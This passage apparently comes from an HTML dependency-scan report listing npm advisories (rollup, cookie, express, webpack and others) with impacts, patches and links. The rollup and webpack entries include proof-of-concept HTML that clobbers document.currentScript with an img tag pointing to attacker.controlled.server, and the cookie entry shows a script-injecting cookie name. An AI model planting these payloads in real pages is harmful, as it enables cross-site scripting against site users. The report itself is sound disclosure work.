allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.<br><br>### PoC<br><br>Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.<br><br>```<br>var s = document.createElement(&amp;#39;script&amp;#39;)<br>s.src = import.meta.url + &amp;#39;extra.js&amp;#39;<br>document.head.append(s)<br>```<br><br>The output `bundle.js` is shown in the following code snippet.<br><br>```<br>&amp;#39;use strict&amp;#39;;<br><br>var _documentCurrentScript = typeof document !== &amp;#39;undefined&amp;#39; ? document.currentScript : null;<br>var s = document.createElement(&amp;#39;script&amp;#39;);<br>s.src = (typeof document === &amp;#39;undefined&amp;#39; ? require(&amp;#39;u&amp;#39; + &amp;#39;rl&amp;#39;).pathToFileURL(__filename).href : (_documentCurrentScript &amp;amp;&amp;amp; False &amp;amp;&amp;amp; _documentCurrentScript.src || new URL(&amp;#39;bundle.js&amp;#39;, document.baseURI).href)) + &amp;#39;extra.js&amp;#39;;<br>document.head.append(s);<br>```<br><br>Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker&amp;#39;s domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website&amp;#39;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.<br><br>```<br>&amp;lt;!DOCTYPE html&amp;gt;<br>&amp;lt;html&amp;gt;<br>&amp;lt;head&amp;gt;<br>  &amp;lt;title&amp;gt;rollup Example&amp;lt;/title&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element starts--!&amp;gt;<br>  &amp;lt;img name=&amp;quot;currentScript&amp;quot; src=&amp;quot;https://attacker.controlled.server/&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element ends--!&amp;gt;<br>&amp;lt;/head&amp;gt;<br>&amp;lt;script type=&amp;quot;module&amp;quot; crossorigin src=&amp;quot;bundle.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;<br>&amp;lt;body&amp;gt;<br>&amp;lt;/body&amp;gt;<br>&amp;lt;/html&amp;gt;<br>```<br><br>### Impact<br><br>This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.<br><br>### Patch<br><br>Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.<br><br>```<br>const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&amp;gt;<br>	getResolveUrl(<br>		`&amp;#39;${escapeId(relativePath)}&amp;#39;, ${<br>			umd ? `typeof document === &amp;#39;undefined&amp;#39; ? location.href : ` : &amp;#39;&amp;#39;<br>		}document.currentScript &amp;amp;&amp;amp; document.currentScript.tagName.toUpperCase() === &amp;#39;SCRIPT&amp;#39; &amp;amp;&amp;amp; document.currentScript.src || document.baseURI`<br>	);<br>```<br><br>```<br>const getUrlFromDocument = (chunkId: string, umd = false) =&amp;gt;<br>	`${<br>		umd ? `typeof document === &amp;#39;undefined&amp;#39; ? location.href : ` : &amp;#39;&amp;#39;<br>	}(${DOCUMENT_CURRENT_SCRIPT} &amp;amp;&amp;amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === &amp;#39;SCRIPT&amp;#39; &amp;amp;&amp;amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL(&amp;#39;${escapeId(<br>		chunkId<br>	)}&amp;#39;, document.baseURI).href)`;<br>```<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-47068<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-47068</span><br><span class="vuln-link">https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</span><br><span class="vuln-link">https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</span><br><span class="vuln-link">https://github.com/rollup/rollup</span><br><span class="vuln-link">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</span><br><span class="vuln-link">https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</span><br><br><div class="section-header">影响范围: </div><br>rollup: &gt;= 3.0.0 &lt; 3.29.5 <br>rollup: &gt;= 4.0.0 &lt; 4.22.4 <br>rollup: 所有版本 &lt; 2.79.2 <br><br><br><div class="cve-header">来自 CVE-2024-47068 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-pxg6-pf52-xh8x</td>
+                            <td>### Impact<br><br>The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(&amp;quot;userName=&amp;lt;script&amp;gt;alert(&amp;#39;XSS3&amp;#39;)&amp;lt;/script&amp;gt;; Max-Age=2592000; a&amp;quot;, value)` would result in `&amp;quot;userName=&amp;lt;script&amp;gt;alert(&amp;#39;XSS3&amp;#39;)&amp;lt;/script&amp;gt;; Max-Age=2592000; a=test&amp;quot;`, setting `userName` cookie to `&amp;lt;script&amp;gt;` and ignoring `value`.<br><br>A similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.<br><br>### Patches<br><br>Upgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.<br><br>### Workarounds<br><br>Avoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.<br><br>### References<br><br>* https://github.com/jshttp/cookie/pull/167<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-47764<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x</span><br><span class="vuln-link">https://github.com/jshttp/cookie/pull/167</span><br><span class="vuln-link">https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c</span><br><span class="vuln-link">https://github.com/jshttp/cookie</span><br><br><div class="section-header">影响范围: </div><br>cookie: 所有版本 &lt; 0.7.0 <br><br><br><div class="cve-header">来自 CVE-2024-47764 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-qw6h-vgh9-j6wx</td>
+                            <td>### Impact<br><br>In express &amp;lt;4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code<br><br>### Patches<br><br>this issue is patched in express 4.20.0<br><br>### Workarounds<br><br>users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist<br><br>### Details<br><br>successful exploitation of this vector requires the following:<br><br>1. The attacker MUST control the input to response.redirect()<br>1. express MUST NOT redirect before the template appears<br>1. the browser MUST NOT complete redirection before:<br>1. the user MUST click on the link in the template<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-43796<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/expressjs/express/security/advisories/GHSA-qw6h-vgh9-j6wx</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-43796</span><br><span class="vuln-link">https://github.com/expressjs/express/commit/54271f69b511fea198471e6ff3400ab805d6b553</span><br><span class="vuln-link">https://github.com/expressjs/express</span><br><br><div class="section-header">影响范围: </div><br>express: 所有版本 &lt; 4.20.0 <br>express: &gt;= 5.0.0-alpha.1 &lt; 5.0.0 <br><br><br><div class="cve-header">来自 CVE-2024-43796 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-m6fv-jmcg-4jfg</td>
+                            <td>### Impact<br><br>passing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code<br><br>### Patches<br><br>this issue is patched in send 0.19.0<br><br>### Workarounds<br><br>users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist<br><br>### Details<br><br>successful exploitation of this vector requires the following:<br><br>1. The attacker MUST control the input to response.redirect()<br>1. express MUST NOT redirect before the template appears<br>1. the browser MUST NOT complete redirection before:<br>1. the user MUST click on the link in the template<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-43799<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/pillarjs/send/security/advisories/GHSA-m6fv-jmcg-4jfg</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-43799</span><br><span class="vuln-link">https://github.com/pillarjs/send/commit/ae4f2989491b392ae2ef3b0015a019770ae65d35</span><br><span class="vuln-link">https://github.com/pillarjs/send</span><br><br><div class="section-header">影响范围: </div><br>send: 所有版本 &lt; 0.19.0 <br><br><br><div class="cve-header">来自 CVE-2024-43799 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-cm22-4g7w-348p</td>
+                            <td>### Impact<br><br>passing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code<br><br>### Patches<br><br>this issue is patched in serve-static 1.16.0<br><br>### Workarounds<br><br>users are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist<br><br>### Details<br><br>successful exploitation of this vector requires the following:<br><br>1. The attacker MUST control the input to response.redirect()<br>1. express MUST NOT redirect before the template appears<br>1. the browser MUST NOT complete redirection before:<br>1. the user MUST click on the link in the template<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-43800<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/expressjs/serve-static/security/advisories/GHSA-cm22-4g7w-348p</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-43800</span><br><span class="vuln-link">https://github.com/expressjs/serve-static/commit/0c11fad159898cdc69fd9ab63269b72468ecaf6b</span><br><span class="vuln-link">https://github.com/expressjs/serve-static/commit/ce730896fddce1588111d9ef6fdf20896de5c6fa</span><br><span class="vuln-link">https://github.com/expressjs/serve-static</span><br><br><div class="section-header">影响范围: </div><br>serve-static: 所有版本 &lt; 1.16.0 <br>serve-static: &gt;= 2.0.0 &lt; 2.1.0 <br><br><br><div class="cve-header">来自 CVE-2024-43800 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-mqr2-w7wj-jjgr</td>
+                            <td>Versions of the package mysql2 before 3.9.3 are vulnerable to Improper Input Validation through the `keyFromFields` function, resulting in cache poisoning. An attacker can inject a colon `:` character within a value of the attacker-crafted key.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21507<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21507</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/pull/2424</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/commit/0d54b0ca6498c823098426038162ef10df02c818</span><br><span class="vuln-link">https://blog.slonser.info/posts/mysql2-attacker-configuration</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6591300</span><br><br><div class="section-header">影响范围: </div><br>mysql2: 所有版本 &lt; 3.9.3 <br><br><br><div class="cve-header">来自 CVE-2024-21507 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-49j4-86m8-q2jw</td>
+                            <td>Versions of the package mysql2 before 3.9.4 are vulnerable to Prototype Poisoning due to insecure results object creation and improper user input sanitization passed through `parserFn` in `text_parser.js` and `binary_parser.js`.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-21509<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-21509</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/pull/2574</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/commit/4a964a3910a4b8de008696c554ab1b492e9b4691</span><br><span class="vuln-link">https://blog.slonser.info/posts/mysql2-attacker-configuration</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/blob/fd3d117da82cc5c5fa5a3701d7b33ca77691bc61/lib/parsers/text_parser.js%23L134</span><br><span class="vuln-link">https://github.com/sidorares/node-mysql2/releases/tag/v3.9.4</span><br><span class="vuln-link">https://security.snyk.io/vuln/SNYK-JS-MYSQL2-6591084</span><br><br><div class="section-header">影响范围: </div><br>mysql2: 所有版本 &lt; 3.9.4 <br><br><br><div class="cve-header">来自 CVE-2024-21509 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-968p-4wvh-cqc8</td>
+                            <td>### Impact<br><br>When using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).<br><br>Your generated code is vulnerable if _all_ the following conditions are true:<br><span class="vuln-link">You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)</span><br>You use the `.replace` method on a regular expression that contains named capturing groups<br>**Your code uses untrusted strings as the second argument of `.replace`**<br><br>If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:<br><span class="vuln-link">you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23</span><br><span class="vuln-link">you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10</span><br><br>You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).<br><br><br>### Patches<br><br>This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It&amp;#39;s likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.<br><br>Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.<br><br>### Workarounds<br><br>If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$&amp;lt;` if it&amp;#39;s then not followed by `&amp;gt;` (possibly with other characters in between).<br><br>### References<br><br>This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2025-27789<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2025-27789</span><br><span class="vuln-link">https://github.com/babel/babel/pull/17173</span><br><span class="vuln-link">https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4</span><br><span class="vuln-link">https://github.com/babel/babel</span><br><br><div class="section-header">影响范围: </div><br>@babel/helpers: 所有版本 &lt; 7.26.10 <br>@babel/runtime: 所有版本 &lt; 7.26.10 <br>@babel/runtime-corejs2: 所有版本 &lt; 7.26.10 <br>@babel/runtime-corejs3: 所有版本 &lt; 7.26.10 <br>@babel/helpers: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br>@babel/runtime: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br>@babel/runtime-corejs2: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br>@babel/runtime-corejs3: &gt;= 8.0.0-alpha.0 &lt; 8.0.0-alpha.17 <br><br><br><div class="cve-header">来自 CVE-2025-27789 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv</td>
+                            <td>The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn&amp;#39;t find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won&amp;#39;t start backtracking the regular expression due to greedy matching.<br><br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-4067<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-4067</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/issues/243</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/pull/247</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/pull/266</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0</span><br><span class="vuln-link">https://advisory.checkmarx.net/advisory/CVE-2024-4067</span><br><span class="vuln-link">https://devhub.checkmarx.com/cve-details/CVE-2024-4067</span><br><span class="vuln-link">https://github.com/micromatch/micromatch</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448</span><br><span class="vuln-link">https://github.com/micromatch/micromatch/releases/tag/4.0.8</span><br><br><div class="section-header">影响范围: </div><br>micromatch: 所有版本 &lt; 4.0.8 <br><br><br><div class="cve-header">来自 CVE-2024-4067 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-mwcw-c2x4-8c55</td>
+                            <td>When nanoid is called with a fractional value, there were a number of undesirable effects:<br><br>1. in browser and non-secure, the code infinite loops on while (size--)<br>2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled<br>3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error<br><br>Version 3.3.8 and 5.0.9 are fixed.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-55565<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-55565</span><br><span class="vuln-link">https://github.com/ai/nanoid/pull/510</span><br><span class="vuln-link">https://github.com/ai/nanoid</span><br><span class="vuln-link">https://github.com/ai/nanoid/compare/3.3.7...3.3.8</span><br><span class="vuln-link">https://github.com/ai/nanoid/releases/tag/5.0.9</span><br><br><div class="section-header">影响范围: </div><br>nanoid: &gt;= 4.0.0 &lt; 5.0.9 <br>nanoid: 所有版本 &lt; 3.3.8 <br><br><br><div class="cve-header">来自 CVE-2024-55565 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j</td>
+                            <td>An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\r` discrepancies, as demonstrated by `@font-face{ font:(\r/*);}` in a rule.<br><br>This vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2023-44270<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2023-44270</span><br><span class="vuln-link">https://github.com/github/advisory-database/issues/2820</span><br><span class="vuln-link">https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5</span><br><span class="vuln-link">https://github.com/postcss/postcss</span><br><span class="vuln-link">https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25</span><br><span class="vuln-link">https://github.com/postcss/postcss/releases/tag/8.4.31</span><br><br><div class="section-header">影响范围: </div><br>postcss: 所有版本 &lt; 8.4.31 <br><br><br><div class="cve-header">来自 CVE-2023-44270 的附加信息:</div></td>
+                        </tr>
+                        
+                        <tr>
+                            <td>Warn: Project is vulnerable to: GHSA-4vvj-4cpr-p986</td>
+                            <td>### Summary<br><br>We discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.<br><br>We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.<br><br><br>### Details<br><br>#### Backgrounds<br><br>DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:<br><br>[1] https://scnps.co/papers/sp23_domclob.pdf<br>[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/<br><br><br>#### Gadgets found in Webpack<br><br>We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:<br><br>```<br>/******/ 	/* webpack/runtime/publicPath */<br>/******/ 	(() =&amp;gt; {<br>/******/ 		var scriptUrl;<br>/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + &amp;quot;&amp;quot;;<br>/******/ 		var document = __webpack_require__.g.document;<br>/******/ 		if (!scriptUrl &amp;amp;&amp;amp; document) {<br>/******/ 			if (document.currentScript)<br>/******/ 				scriptUrl = document.currentScript.src;<br>/******/ 			if (!scriptUrl) {<br>/******/ 				var scripts = document.getElementsByTagName(&amp;quot;script&amp;quot;);<br>/******/ 				if(scripts.length) {<br>/******/ 					var i = scripts.length - 1;<br>/******/ 					while (i &amp;gt; -1 &amp;amp;&amp;amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;<br>/******/ 				}<br>/******/ 			}<br>/******/ 		}<br>/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration<br>/******/ 		// or pass an empty string (&amp;quot;&amp;quot;) and set the __webpack_public_path__ variable from your code to use your own logic.<br>/******/ 		if (!scriptUrl) throw new Error(&amp;quot;Automatic publicPath is not supported in this browser&amp;quot;);<br>/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, &amp;quot;&amp;quot;).replace(/\?.*$/, &amp;quot;&amp;quot;).replace(/\/[^\/]+$/, &amp;quot;/&amp;quot;);<br>/******/ 		__webpack_require__.p = scriptUrl;<br>/******/ 	})();<br>```<br><br>However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker&amp;#39;s domain. This could lead to arbitrary script loading from the attacker&amp;#39;s server, resulting in severe security risks.<br><br>### PoC<br><br>Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.<br><br>Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:<br><br>```<br>// entry.js<br>import(&amp;#39;./import1.js&amp;#39;)<br>  .then(module =&amp;gt; {<br>    module.hello();<br>  })<br>  .catch(err =&amp;gt; {<br>    console.error(&amp;#39;Failed to load module&amp;#39;, err);<br>  });<br>```<br><br>```<br>// import1.js<br>export function hello () {<br>  console.log(&amp;#39;Hello&amp;#39;);<br>}<br>```<br><br>The webpack.config.js is set up as follows:<br>```<br>const path = require(&amp;#39;path&amp;#39;);<br><br>module.exports = {<br>  entry: &amp;#39;./entry.js&amp;#39;, // Ensure the correct path to your entry file<br>  output: {<br>    filename: &amp;#39;webpack-gadgets.bundle.js&amp;#39;, // Output bundle file<br>    path: path.resolve(__dirname, &amp;#39;dist&amp;#39;), // Output directory<br>    publicPath: &amp;quot;auto&amp;quot;, // Or leave this field not set<br>  },<br>  target: &amp;#39;web&amp;#39;,<br>  mode: &amp;#39;development&amp;#39;,<br>};<br>```<br><br>When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker&amp;#39;s domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website&amp;#39;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.<br><br>```<br>&amp;lt;!DOCTYPE html&amp;gt;<br>&amp;lt;html&amp;gt;<br>&amp;lt;head&amp;gt;<br>  &amp;lt;title&amp;gt;Webpack Example&amp;lt;/title&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element starts--!&amp;gt;<br>  &amp;lt;img name=&amp;quot;currentScript&amp;quot; src=&amp;quot;https://attacker.controlled.server/&amp;quot;&amp;gt;&amp;lt;/img&amp;gt;<br>  &amp;lt;!-- Attacker-controlled Script-less HTML Element ends--!&amp;gt;<br>&amp;lt;/head&amp;gt;<br>&amp;lt;script src=&amp;quot;./dist/webpack-gadgets.bundle.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;<br>&amp;lt;body&amp;gt;<br>&amp;lt;/body&amp;gt;<br>&amp;lt;/html&amp;gt;<br>```<br><br>### Impact<br><br>This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.<br><br>### Patch<br><br>A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174<br><br>```<br>/******/ 	/* webpack/runtime/publicPath */<br>/******/ 	(() =&amp;gt; {<br>/******/ 		var scriptUrl;<br>/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + &amp;quot;&amp;quot;;<br>/******/ 		var document = __webpack_require__.g.document;<br>/******/ 		if (!scriptUrl &amp;amp;&amp;amp; document) {<br>/******/ 			if (document.currentScript &amp;amp;&amp;amp; document.currentScript.tagName.toUpperCase() === &amp;#39;SCRIPT&amp;#39;) // Assume attacker cannot control script tag, otherwise it is XSS already :&amp;gt;<br>/******/ 				scriptUrl = document.currentScript.src;<br>/******/ 			if (!scriptUrl) {<br>/******/ 				var scripts = document.getElementsByTagName(&amp;quot;script&amp;quot;);<br>/******/ 				if(scripts.length) {<br>/******/ 					var i = scripts.length - 1;<br>/******/ 					while (i &amp;gt; -1 &amp;amp;&amp;amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;<br>/******/ 				}<br>/******/ 			}<br>/******/ 		}<br>/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration<br>/******/ 		// or pass an empty string (&amp;quot;&amp;quot;) and set the __webpack_public_path__ variable from your code to use your own logic.<br>/******/ 		if (!scriptUrl) throw new Error(&amp;quot;Automatic publicPath is not supported in this browser&amp;quot;);<br>/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, &amp;quot;&amp;quot;).replace(/\?.*$/, &amp;quot;&amp;quot;).replace(/\/[^\/]+$/, &amp;quot;/&amp;quot;);<br>/******/ 		__webpack_require__.p = scriptUrl;<br>/******/ 	})();<br>```<br><br>Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.<br><br><div class="section-header">相关漏洞ID: </div><br>CVE-2024-43788<br>CVE-2024-45389<br>CVE-2024-45812<br>GHSA-64vr-g452-qvp3<br>GHSA-gprj-6m2f-j9hx<br><br><div class="section-header">参考链接: </div><br><span class="vuln-link">https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986</span><br><span class="vuln-link">https://nvd.nist.gov/vuln/detail/CVE-2024-43788</span><br><span class="vuln-link">https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270</span><br><span class="vuln-link">https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61</span><br><span class="vuln-link">https://github.com/webpack/webpack</span><br><span class="vuln-link">https://research.securitum.com/xss-in-amp4email-dom-clobbering</span><br><span class="vuln-link">https://scnps.co/papers/sp23_domclob.pdf</span><br><br><div class="section-header">影响范围: </div><br>webpack: &gt;= 5.0.0-alpha.0 &lt; 5.94.0 <br><br><br><div class="cve-header">来自 CVE-2024-43788 的附加信息:</div><br><br><div 